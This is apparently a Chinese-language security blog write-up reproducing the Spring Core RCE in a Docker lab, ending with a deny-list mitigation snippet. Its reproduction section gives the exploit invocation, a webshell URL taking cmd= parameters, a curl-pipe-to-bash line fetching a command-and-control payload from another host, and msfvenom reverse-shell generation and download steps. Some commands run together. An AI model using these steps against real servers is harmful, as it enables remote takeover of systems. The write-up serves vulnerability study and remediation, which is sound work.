0x00 漏洞概述

继 Spring Cloud 注入之后，3.29 日 ，网上爆出Spring 的又一重量级漏洞：Spring Core RCE。当时我和大家一样，晚上7、8点，刚下班到家做饭吃完，结果就看到群里面都在说这个。整个晚上，安全圈都炸了。又一次见证了历史，那天晚上全网安全圈的人都在等exp，就像等一个孩子出生一样。有意思的是，github上还有人放出了假的exp进行钓鱼，真行啊！第二天，github上有勇士传了exp，不过过了快1小时他又删除了。

0x04 漏洞复现

第一个exp

kali上使用exp攻击：

┌──(root💀kali)-[/home/sss/Desktop]└─# python3 test.py --url http://192.168.159.130:5000/                                           2 ⨯漏洞存在，shell地址为:http://192.168.159.130:5000/tomcatwar.jsp?pwd=j&cmd=whoami

访问此网页即可

通过进入docker靶机，查看到具有curl这个下载命令

 docker exec -it <容器id> /bin/bash
 curl --help


本想着CS CrossC2一句话上线，但是CS后面的那个| bash -s在URL上实在是不能在URL上做到。

 curl -A O -o- -L http://192.168.159.128:55413/a | bash -s

于是想着用MSF生成木马，然后远程下载执行一下就行了。

msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elfpython3 -m server http://ip:portmsf监听handler -H 0.0.0.0 -P 6666 -p linux/x64/meterpreter/reverse_tcp随后cmd=curl http://ip:port/shell.elf --output shell.elf下载木马




可以看到这是docker环境。成功上线。

0x05 修复建议

临时修复建议： 

在 Spring Framework 中，DataBinder 具有禁止某些模式的功能。作为此漏洞的临时缓解措施，Praetorian建议创建一个ControllerAdvice组件（这是一个跨控制器共享的 Spring 组件）并将危险模式添加到拒绝名单中。示例片段如下所示：

import org.springframework.core.Ordered;import org.springframework.core.annotation.Order;import org.springframework.web.bind.WebDataBinder;import org.springframework.web.bind.annotation.ControllerAdvice;import org.springframework.web.bind.annotation.InitBinder; @ControllerAdvice@Order(10000)public class BinderControllerAdvice {    @InitBinder    public void setAllowedFields(WebDataBinder dataBinder) {         String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};         dataBinder.setDisallowedFields(denylist);   }}
